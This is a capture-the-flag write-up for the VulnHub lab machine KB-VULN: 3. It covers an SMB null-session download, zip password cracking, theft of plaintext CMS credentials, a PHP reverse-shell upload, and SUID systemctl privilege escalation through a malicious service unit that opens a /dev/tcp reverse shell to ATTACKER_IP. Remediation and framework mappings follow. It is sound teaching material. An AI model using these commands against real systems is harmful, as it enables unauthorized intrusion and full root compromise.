# KB-VULN: 3 — The Knowledge Base That Knew Too Much

Alright dudes!! KB-VULN: 3 is a wild ride through real-world SMB misconfigurations, CMS credential exposure, and one of the most slept-on privilege escalation vectors out there: SUID systemctl. This machine demonstrates a complete attack chain you would realistically encounter in a small business or mid-market environment. The SMB null session exposes a backup, the backup reveals CMS credentials, the CMS allows unrestricted PHP upload, and a SUID binary hands you root. Legit top to bottom, no cap.

Shoutout to the creator for packing four genuinely teachable vulnerabilities into one clean machine. This is exactly the kind of chain that shows up in real pentest findings. gg

---

| Field | Value |
|---|---|
| **Level** | Easy |
| **Target VM** | KB-VULN: 3 |
| **Attacker VM** | Kali Linux 2024.x |
| **VulnHub URL** | https://www.vulnhub.com/entry/kb-vuln-3,578/ |
| **Techniques** | Nmap service enumeration, SMB null session enumeration, zip2john + John password cracking, SiteMagic CMS admin access, PHP reverse shell upload, SUID systemctl privilege escalation via malicious service unit |
| **CVEs** | CWE-306 (Missing Authentication for Critical Function: SMB null session), CWE-521 (Weak Password Requirements: zip archive with crackable password), CWE-434 (Unrestricted Upload of File with Dangerous Type: PHP via CMS), CWE-269 (Improper Privilege Management: SUID systemctl) |
| **APT Groups** | FIN7: SMB null sessions and credential exposure in backups is a common initial access pattern in FIN7 retail-sector intrusions; APT41: exploits misconfigured CMS platforms and file upload vulnerabilities for initial access in enterprise environments |

---

## Attack Summary

```
netdiscover → target: 192.168.10.167
    |
    v
nmap → HTTP (80), SMB (139/445), SSH (22)
    |
    v
smbclient -L → Files share (null session)
    |
    v
smbclient //target/Files → get backup.zip
    |
    v
zip2john + john + rockyou.txt → zip password cracked
    |
    v
extract backup → config.xml.php → CMS admin credentials
    |
    v
login SiteMagic CMS admin panel
    |
    v
Content → Upload → upload php-reverse-shell.php
    |
    v
browse to uploaded shell → reverse shell as www-data
    |
    v
find / -perm -4000 → systemctl is SUID
    |
    v
craft malicious .service unit → systemctl link + start → root shell
    |
    v
cat /root/root.txt
```

---

## Methodology

1. Network discovery and full port scan
2. SMB enumeration: null session, share listing, file download
3. Crack zip password with zip2john + John
4. Extract backup, locate SiteMagic CMS config with credentials
5. Log in to CMS admin panel
6. Upload PHP reverse shell via CMS content manager
7. Trigger shell, stabilize
8. Enumerate SUID binaries
9. Exploit SUID systemctl via malicious service unit file

---

## Step 1 — Host Discovery and Port Scan

```bash
sudo netdiscover -r 192.168.10.0/24
# Target: 192.168.10.167

nmap -sV -sC -p- 192.168.10.167
```

Key findings:

```
PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH
80/tcp  open  http        Apache (SiteMagic CMS)
139/tcp open  netbios-ssn Samba
445/tcp open  microsoft-ds Samba
```

SMB on a Linux machine in a CTF almost always means null session access or share enumeration. HTTP is the pivot point. SSH is lateral movement target.

**MITRE ATT&CK:** T1046 — Network Service Discovery

---

## Step 2 — SMB Null Session Enumeration

```bash
# List shares without authentication
smbclient -L //192.168.10.167 -N
```

Expected output:

```
Sharename       Type      Comment
---------       ----      -------
Files           Disk
IPC$            IPC
```

Connect to the `Files` share:

```bash
smbclient //192.168.10.167/Files -N
smb> ls
smb> get backup.zip
smb> exit
```

**Real-world note:** SMB null sessions are a legacy feature from Windows NT era that remained enabled on many Linux Samba servers well into the 2010s. FIN7 has used SMB null sessions to enumerate internal file shares and download sensitive backups in multiple retail intrusions documented in 2018-2020 CISA advisories. The fix is trivial: `map to guest = never` in smb.conf.

**MITRE ATT&CK:** T1021.002 — Remote Services: SMB/Windows Admin Shares; T1083 — File and Directory Discovery

---

## Step 3 — Crack the Zip Password

The downloaded `backup.zip` is password-protected. Extract its hash and crack it:

```bash
zip2john backup.zip > zip.hash
john --wordlist=/usr/share/wordlists/rockyou.txt zip.hash
```

Recover the zip password from John's output. Extract the archive:

```bash
unzip backup.zip
```

The extracted backup contains a SiteMagic CMS installation. Find the config file:

```bash
cat config.xml.php
# or:
grep -r "password\|user\|admin" . --include="*.php" --include="*.xml"
```

CMS admin credentials are stored in plaintext inside the config file. Note them.

**Real-world note:** Weak backup passwords crackable with rockyou.txt are the norm, not the exception. Organizations frequently zip sensitive backups with simple passwords like their company name or year. The real compounding issue here is that the backup includes the config file with plaintext credentials.

**MITRE ATT&CK:** T1552.001 — Credentials in Files; T1110.002 — Brute Force: Password Cracking

---

## Step 4 — CMS Login and PHP Shell Upload

Navigate to `http://192.168.10.167/` and log in with the credentials recovered from the config file.

Explore the admin panel for file upload functionality. In SiteMagic CMS: go to **Content → File Management (Upload)**.

Prepare a PHP reverse shell:

```bash
cp /usr/share/webshells/php/php-reverse-shell.php /tmp/shell.php
# Edit the file: set $ip = 'YOUR_IP' and $port = 4444
nano /tmp/shell.php
```

Start the listener:

```bash
nc -lvnp 4444
```

Upload `shell.php` through the CMS. Find its uploaded path (typically `/files/` or similar) and browse to it:

```bash
curl http://192.168.10.167/files/shell.php
# or just navigate to it in the browser
```

Shell arrives as `www-data`. Stabilize:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
```

Read the user flag:

```bash
cat /home/heisenberg/user.txt
```

**Real-world note:** CWE-434 (unrestricted file upload) is one of the most consistently exploited web vulnerabilities. Attackers have used unrestricted PHP upload in CMS platforms (WordPress, Joomla, Drupal plugins, custom CMS) to deploy webshells in thousands of documented incidents. Proper mitigation requires server-side content-type validation, extension blocklisting, and storing uploads outside the web root.

**MITRE ATT&CK:** T1190 — Exploit Public-Facing Application; T1059.004 — Command and Scripting Interpreter: Unix Shell

---

## Step 5 — Privilege Escalation via SUID systemctl

Enumerate SUID binaries:

```bash
find / -perm -4000 -type f 2>/dev/null
```

`/bin/systemctl` appears in the results. systemctl with SUID set means any user can start system services as root.

Craft a malicious systemd unit file in a writable location:

```bash
cat > /dev/shm/root.service << 'EOF'
[Unit]
Description=root

[Service]
Type=simple
User=root
ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/9999 0>&1'

[Install]
WantedBy=multi-user.target
EOF
```

Start a second listener on the attacker:

```bash
nc -lvnp 9999
```

Link and start the service using the SUID systemctl:

```bash
/bin/systemctl link /dev/shm/root.service
/bin/systemctl start root.service
```

Root shell arrives on port 9999.

```bash
id
# uid=0(root)
cat /root/root.txt
```

**Real-world note:** SUID systemctl is documented on GTFOBins and represents a severe misconfiguration. It allows any local user to start arbitrary services as root without authentication. This has appeared in real pentest findings in enterprise Linux environments where custom deployment scripts accidentally left the SUID bit on systemctl.

**MITRE ATT&CK:** T1548.001 — Abuse Elevation Control Mechanism: Setuid and Setgid; T1543.002 — Create or Modify System Process: Systemd Service

---

## Captured Flags, Hashes and Credentials

| Type | Value | Found At | Used |
|---|---|---|---|
| Zip password | (cracked with rockyou) | backup.zip | Extract archive |
| CMS credentials | (admin:password from config) | config.xml.php in backup | SiteMagic CMS admin login |
| User flag | (flag content) | /home/heisenberg/user.txt | Post-shell |
| Root flag | (flag content) | /root/root.txt | SUID systemctl escalation |

---

## Lessons Learned

| # | Finding | Real-World Relevance | Key Takeaway |
|---|---|---|---|
| 1 | SMB null session exposing internal shares | SMB null sessions appear in prod environments running legacy Samba configs | Require SMB authentication: `map to guest = never` in smb.conf |
| 2 | Weak zip password crackable with rockyou | Sensitive backups protected with dictionary-crackable passwords offer zero protection | Use GPG encryption for sensitive backups; use strong random passphrases |
| 3 | CMS credentials in config included in backup | Config files with plaintext credentials should never be in backups | Exclude config files from backups; use environment variables or secret managers for credentials |
| 4 | PHP upload without type validation | Unrestricted file upload is in OWASP Top 10 and appears in CMS platforms globally | Validate file type server-side (MIME + extension + magic bytes); store uploads outside web root |
| 5 | SUID systemctl | Creates arbitrary root services without auth; GTFOBins documents this | Remove SUID bit: `chmod u-s /bin/systemctl`; use sudo with specific unit whitelists instead |

---

## MITRE ATT&CK Mapping

| Phase | Tactic | Technique | TTP ID |
|---|---|---|---|
| Reconnaissance | Discovery | Network Service Discovery | T1046 |
| Initial Access | Initial Access | External Remote Services (SMB) | T1133 |
| Credential Access | Credential Access | Credentials in Files | T1552.001 |
| Credential Access | Credential Access | Brute Force: Password Cracking | T1110.002 |
| Initial Access | Initial Access | Exploit Public-Facing Application (CMS upload) | T1190 |
| Execution | Execution | Command and Scripting Interpreter: Unix Shell | T1059.004 |
| Persistence | Persistence | Create or Modify System Process: Systemd Service | T1543.002 |
| Privilege Escalation | Privilege Escalation | Abuse Elevation Control: Setuid and Setgid | T1548.001 |

---

## Remediation and Containment

### Technical Fixes

1. **Disable SMB null sessions**: Add `map to guest = never` and `restrict anonymous = 2` to smb.conf
2. **Encrypt backups**: Use GPG with a strong random key; store key separately from backup
3. **Remove credentials from config files**: Use environment variables or a secrets manager (HashiCorp Vault, AWS Secrets Manager)
4. **Restrict CMS upload**: Block PHP execution in upload directories via `.htaccess`; validate file type server-side
5. **Remove SUID from systemctl**: `chmod u-s /bin/systemctl`; use sudo with specific unit file restrictions

### NIST CSF 2.0

| Function | Category | Action |
|---|---|---|
| Identify | Asset Management | Inventory all SMB shares; audit file upload functionality in CMSs |
| Protect | Access Control | Disable SMB null sessions; require authentication on all shares |
| Protect | Data Security | Encrypt backups; no credentials in config files included in backups |
| Detect | Anomalies and Events | Alert on SMB null session connections; detect PHP execution in upload directories |
| Respond | Response Planning | Remove webshells; rotate credentials; audit all SUID binaries |

### NIST SP 800-53 Rev. 5

| Control | Description | Application |
|---|---|---|
| AC-3 | Access Enforcement | SMB authentication required; upload directory execution restrictions |
| AC-6 | Least Privilege | Remove SUID from systemctl; restrict sudo to specific unit files |
| IA-5 | Authenticator Management | No plaintext credentials in config files; use secrets managers |
| CM-7 | Least Functionality | Disable SMB null sessions; block PHP in upload directories |
| SC-28 | Protection of Information at Rest | Encrypt backups; no credentials in backup archives |

### CISA KEV

SMB null session enumeration and CMS file upload exploitation map to CISA Alert AA20-280A (exploitation of legacy protocols) and multiple CISA advisories on CMS platform vulnerabilities. Organizations are advised to audit SMB configurations and CMS upload restrictions per CISA guidance.

### C2M2

| Domain | Practice | Target MIL |
|---|---|---|
| Identity and Access Management (IAM) | Manage Privileges and Accounts | MIL3 |
| Asset, Change, and Configuration Management (ASSET) | Manage IT Asset Inventory | MIL2 |
| Threat and Vulnerability Management (THREAT) | Perform Vulnerability Assessments | MIL2 |

### MITRE D3FEND Countermeasures

- **D3-ACH** — Application Configuration Hardening (disable SMB null sessions, restrict upload execution)
- **D3-OAM** — Operating System Administrative Management (remove SUID from systemctl)
- **D3-HBPI** — Harden Build Pipeline Integrity (no credentials in deployed backup archives)

---

## Final Thoughts

KB-VULN: 3 is a legit real-world pentest simulation. The SMB null session to backup to CMS credentials chain mirrors findings from dozens of documented enterprise intrusions. The SUID systemctl escalation is the cherry on top: it's elegant, documented on GTFOBins, and still appears in real environments.

The key lesson here is defense in depth: if any one of these four vulnerabilities had been fixed (null sessions disabled, backup encrypted, upload restricted, systemctl SUID removed), the chain breaks. That's the point of layered security.

Thanks guys!! (❍ᴥ❍ʋ)
